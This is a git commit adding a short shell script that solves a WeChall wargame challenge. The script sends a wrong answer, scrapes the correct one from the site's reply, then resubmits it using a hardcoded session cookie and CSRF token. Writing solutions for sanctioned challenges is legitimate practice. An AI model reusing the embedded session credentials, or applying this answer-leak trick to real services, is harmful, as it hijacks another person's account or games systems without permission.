3694b495b705098fc2470566610652ad6d419db4
SYLAR <cristosantos@gmail.com>
2017-07-14 12:43:43 -0500

    Create SYLAR.sh

---
+++ challenges/wechall/impossible-nest-pas-francais/SYLAR.sh
@@ -0,0 +1,16 @@
+wget -O number.txt --no-cookies --header "Cookie:WC=9708475-34593-jaw9ISkrkhUWYFNQ" \
+	www.wechall.net/challenge/impossible/index.php?request=new_number
+
+
+curl -o resp.txt -b "WC=9708475-34593-jaw9ISkrkhUWYFNQ" -d "solution=13" -d "cmd=Send" \
+	-d "gwf3_csrf=KDMhQzUN" http://www.wechall.net/challenge/impossible/index.php
+
+
+cat resp.txt | grep 'Correct would have been' | grep -o -E '[0-9]+' >> sol.txt
+
+SOLUTION=$(head sol.txt)
+
+echo $SOLUTION
+
+curl -o resp.html -b "WC=9708475-34593-jaw9ISkrkhUWYFNQ" -d "solution=$SOLUTION" -d "cmd=Send" \
+		-d "gwf3_csrf=KDMhQzUN" http://www.wechall.net/challenge/impossible/index.php
